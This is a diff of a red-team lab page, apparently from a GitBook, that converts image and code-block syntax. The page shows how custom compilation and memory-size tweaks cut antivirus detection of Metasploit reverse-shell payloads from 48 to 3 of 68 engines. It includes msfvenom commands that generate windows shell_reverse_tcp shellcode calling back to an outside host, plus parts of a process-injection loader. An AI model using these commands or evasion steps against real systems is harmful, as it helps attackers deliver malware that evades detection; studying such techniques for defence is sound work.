@@ -17,13 +17,13 @@ Final size of exe file: 73802 bytes
 
 Checking the file in [VirusTotal](https://www.virustotal.com/#/file/ebf62a6140591b6ccf81035a7f06b3a6580144cfa5a9de0ad49dd323c4513ee3/detection) gives the following detection rate:
 
-![](../../.gitbook/assets/msf-templates-default-payload.png)
+![[msf-templates-default-payload.png]]
 
 ## 36/68 detections
 
 When generating metasploit payloads, our specified shellcode gets injected into the template binaries. The payload we generated earlier got injected into the template for which the source code is provided below:
 
-![](../../.gitbook/assets/msf-template.png)
+![[msf-template.png]]
 
 Out of curiosity, let's simply recompile the standard template:
 
@@ -44,17 +44,17 @@ Final size of exe file: 363382 bytes
 
 [VirusTotal](https://www.virustotal.com/#/file/c311065c151bdd98efc3c413016a7817f6089985e799121007dd993230c530bd/detection) detections for the new executable dropped from 48 to 36 and that did not require any code change!
 
-![](../../.gitbook/assets/msf-template-vt2.png)
+![[msf-template-vt2.png]]
 
 ## 32/66 detections
 
 If we make a couple of small changes to the code for memory allocation sizes:
 
-![](../../.gitbook/assets/msf-template-sizes.png)
+![[msf-template-sizes.png]]
 
 ...it seems that we can further reduce [VirusTotal](https://www.virustotal.com/#/file/1b2dc633c5709435cd956e214f5417488c04e39ac58ccf5aa8bba4813dc9c005/detection) detections albeit not by much - this time they drop from 36 to 32:
 
-![](../../.gitbook/assets/msf-template-vt3.png)
+![[msf-template-vt3.png]]
 
 ## 8/68 detections - custom x86 binary
 
@@ -64,8 +64,8 @@ Let's do something a bit more custom - build a binary from the previous lab [Cre
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c
 ```
 
-{% code title="inject-local-process.cpp" %}
 ```cpp
+// inject-local-process.cpp
 #include "stdafx.h"
 #include "Windows.h"
 
@@ -104,11 +104,10 @@ int main()
     return 0;
 }
 ```
-{% endcode %}
 
 This time [VirusTotal](https://www.virustotal.com/#/file/f4dfceb473a878a3751513bacb4d44ee460391ce1a668edb5337d4859e767335/detection) detections dropped dramatically to 8/68:
 
-![](../../.gitbook/assets/msf-vt5.png)
+![[msf-vt5.png]]
 
 ## 3/68 detections - custom x64 binary
 
@@ -118,8 +117,8 @@ The above binaries were all for a x86 architecture. Let's try generating the she
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c -b \x00\x0a\x0d
 ```
 
-{% code title="inject-local-process.cpp" %}
 ```cpp
+// inject-local-process.cpp
 #include "stdafx.h"
 #include "Windows.h"
 
@@ -168,13 +167,12 @@ int main()
     return 0;
 }
 ```
-{% endcode %}
 
 [VirusTotal](https://www.virustotal.com/#/file/d1431f479724822d6ccf8684a99598d966a9b5a964e7bd3886308a0217dea712/detection) now only shows **3/68** detections, which is a great improvement that enables us bypassing most of the popular antivirus vendors:
 
-![](../../.gitbook/assets/msf-vt4.png)
+![[msf-vt4.png]]
 
 ## References
 
-{% embed url="https://www.offensive-security.com/metasploit-unleashed/backdooring-exe-files/" %}
+[www.offensive-security.com/metasploit-unleashed/backdooring-exe-files](https://www.offensive-security.com/metasploit-unleashed/backdooring-exe-files/)
 
